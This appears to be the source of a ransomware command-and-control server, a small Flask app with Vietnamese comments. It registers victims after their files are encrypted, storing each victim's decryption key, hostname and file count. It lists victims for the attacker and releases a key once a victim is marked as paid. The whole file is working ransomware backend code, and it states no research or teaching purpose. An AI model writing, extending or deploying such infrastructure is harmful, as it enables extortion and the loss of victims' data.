# manager-agent/c2_server.py
from flask import Flask, request, jsonify
import json, os, datetime

app  = Flask(__name__)
DATA = "c2_victims.json"

def _load():
    if os.path.exists(DATA):
        with open(DATA) as f:
            return json.load(f)
    return {}

def _save(d):
    with open(DATA, 'w') as f:
        json.dump(d, f, indent=2)

# Nạn nhân gọi sau khi bị mã hóa
@app.route('/register', methods=['POST'])
def register():
    d = request.get_json()
    victims = _load()
    victims[d['victim_id']] = {
        'key':       d['key'],          # Key mã hóa
        'files':     d['files'],        # Số file bị mã hóa
        'hostname':  d['hostname'],
        'time':      datetime.datetime.now().isoformat(),
        'paid':      False,
    }
    _save(victims)
    print(f"\n[C&C] *** NEW VICTIM ***")
    print(f"      Host : {d['hostname']}")
    print(f"      Files: {d['files']} files encrypted")
    print(f"      Key  : {d['key'][:16]}...")
    return jsonify({'status': 'ok'})

# Attacker xem danh sách nạn nhân
@app.route('/victims')
def list_victims():
    return jsonify(_load())

# Attacker release key sau khi nhận tiền
@app.route('/release/<victim_id>')
def release(victim_id):
    victims = _load()
    if victim_id not in victims:
        return jsonify({'error': 'not found'}), 404
    victims[victim_id]['paid'] = True
    _save(victims)
    return jsonify({'key': victims[victim_id]['key']})

if __name__ == '__main__':
    print("[C&C] Server started on http://localhost:8888")
    print("[C&C] Waiting for victims...\n")
    app.run(port=8888, debug=False)